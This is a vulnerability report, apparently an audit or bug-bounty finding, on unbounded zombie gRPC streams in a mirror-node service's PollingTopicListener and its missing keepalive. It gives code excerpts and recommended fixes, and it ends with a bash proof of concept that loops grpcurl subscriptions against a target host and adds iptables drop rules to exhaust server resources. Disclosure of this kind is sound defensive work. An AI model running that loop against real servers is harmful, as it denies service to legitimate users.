### Title
Unbounded Zombie gRPC Stream Resource Exhaustion via Missing Keepalive and Timeout in `PollingTopicListener.listen()`

### Summary
`PollingTopicListener.listen()` constructs an infinite polling `Flux` with no `.timeout()` operator and the Netty gRPC server is configured with no keepalive probes. When a network partition silently drops packets (no TCP FIN/RST), the server-side stream remains alive indefinitely, polling the database every 500 ms per zombie subscription. Any unprivileged client can manufacture this condition using a local firewall drop rule, causing unbounded resource exhaustion invisible to the application layer.

### Finding Description

**Exact code path:**

`PollingTopicListener.listen()` (lines 34–49) builds the live-message stream:

```java
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)   // infinite
                .jitter(0.1)
                .withFixedDelay(interval)              // default 500 ms
                .withScheduler(scheduler))
        // NO .timeout() operator
        .doOnNext(context::onNext)
        .doOnSubscribe(s -> log.info(...));
``` [1](#0-0) 

`RepeatSpec.times(Long.MAX_VALUE)` makes the loop effectively infinite. There is no `.timeout()` call anywhere in this file or in the call chain through `TopicMessageServiceImpl.incomingMessages()` → `topicListener.listen(newFilter)`. [2](#0-1) 

By contrast, `PollingTopicMessageRetriever.retrieve()` (the historical path) explicitly applies `.timeout(retrieverProperties.getTimeout(), scheduler)` (default 60 s). The live listener has no equivalent. [3](#0-2) 

**No gRPC keepalive configured:**

`GrpcConfiguration` customises the Netty server builder with only `maxConcurrentCallsPerConnection`. No `keepAliveTime`, `keepAliveTimeout`, or `permitKeepAliveWithoutCalls` is set. [4](#0-3) 

A `grep` across all Java sources for `keepAlive` / `keepalive` returns zero matches, confirming no keepalive is configured anywhere in the application.

**Cancel handler is insufficient:**

`ConsensusController.subscribeTopic()` registers `disposable::dispose` as the cancel handler on the `ServerCallStreamObserver`. This fires only when the gRPC framework receives a proper stream cancellation signal — which requires the TCP layer to deliver a RST or FIN. In a half-open TCP state (network partition with packet drop), no such signal arrives, so `dispose()` is never called and `subscriberCount.decrementAndGet()` / `doFinally` never fire. [5](#0-4) 

**Nginx timeout is bypassable:**

The nginx proxy sets `grpc_read_timeout 600s` for `subscribeTopic`, which resets on each received message. This only applies to connections routed through nginx. Direct connections to port 5600 bypass it entirely, and even through nginx, a topic with no new messages would not reset the timer — but the 600 s window is still far too long and is not a substitute for application-level keepalive. [6](#0-5) 

### Impact Explanation

Each zombie subscription holds a slot in the `boundedElastic` scheduler thread pool and issues a DB query every 500 ms for the lifetime of the half-open TCP connection (up to ~2 hours under default Linux TCP keepalive). With `maxConcurrentCallsPerConnection = 5` and no per-IP connection limit, an attacker opening N TCP connections can sustain 5N zombie polling loops. At scale this exhausts the DB connection pool, the scheduler thread pool, and server memory, degrading or denying service to legitimate subscribers. The `subscriberCount` gauge in Micrometer will show inflated counts but no error signal, making the condition invisible to alert rules that watch for stream errors. [7](#0-6) [8](#0-7) 

### Likelihood Explanation

No privileges are required. The attacker needs only a valid topic ID (publicly discoverable via the REST API) and the ability to manipulate their own outbound firewall (e.g., `iptables -A OUTPUT -p tcp --dport 5600 -j DROP` after the TCP handshake completes). This is a standard technique for creating half-open connections. It is repeatable, scriptable, and requires no authentication. The default listener type is `REDIS`, but when operators switch to `POLL` (documented as a supported option), the vulnerability is fully exposed. [9](#0-8) 

### Recommendation

1. **Add gRPC server-side keepalive** in `GrpcConfiguration`:
   ```java
   serverBuilder.keepAliveTime(30, TimeUnit.SECONDS);
   serverBuilder.keepAliveTimeout(10, TimeUnit.SECONDS);
   serverBuilder.permitKeepAliveWithoutCalls(true);
   ```
   This causes Netty to send HTTP/2 PING frames and close the connection if the client does not respond, detecting half-open connections within ~40 s. [4](#0-3) 

2. **Add an idle/inactivity timeout** to `PollingTopicListener.listen()`, mirroring the retriever pattern:
   ```java
   .timeout(listenerProperties.getIdleTimeout(), scheduler)
   ```
   Expose `idleTimeout` in `ListenerProperties` with a sensible default (e.g., 300 s). [1](#0-0) 

3. **Expose keepalive settings** via `NettyProperties` so operators can tune them without code changes. [10](#0-9) 

### Proof of Concept

**Preconditions:** Direct access to port 5600 (bypassing nginx), a valid topic ID (e.g., obtained from the REST API), and the ability to set a local firewall rule.

**Steps:**

```bash
# 1. Open a gRPC subscription (no limit, future start time → no messages will arrive)
grpcurl -plaintext \
  -d '{"topicID":{"topicNum":41110},"limit":0}' \
  target-host:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &

# 2. Immediately after the TCP handshake completes, drop outbound packets
#    so the server never receives a FIN/RST (simulates network partition)
iptables -A OUTPUT -p tcp --dport 5600 -j DROP

# 3. Repeat steps 1-2 in a loop to accumulate zombie streams
for i in $(seq 1 100); do
  grpcurl -plaintext \
    -d '{"topicID":{"topicNum":41110},"limit":0}' \
    target-host:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  sleep 0.1
  iptables -A OUTPUT -p tcp --dport 5600 -j DROP
done
```

**Expected result:** The server's `hiero.mirror.grpc.subscribers` gauge climbs to 100+ and never decreases. DB query rate increases by 2 queries/second per zombie stream (one poll every 500 ms). No error is logged. The streams remain open until the Linux TCP keepalive timer (~2 hours) fires, by which time the DB connection pool and scheduler thread pool are exhausted.
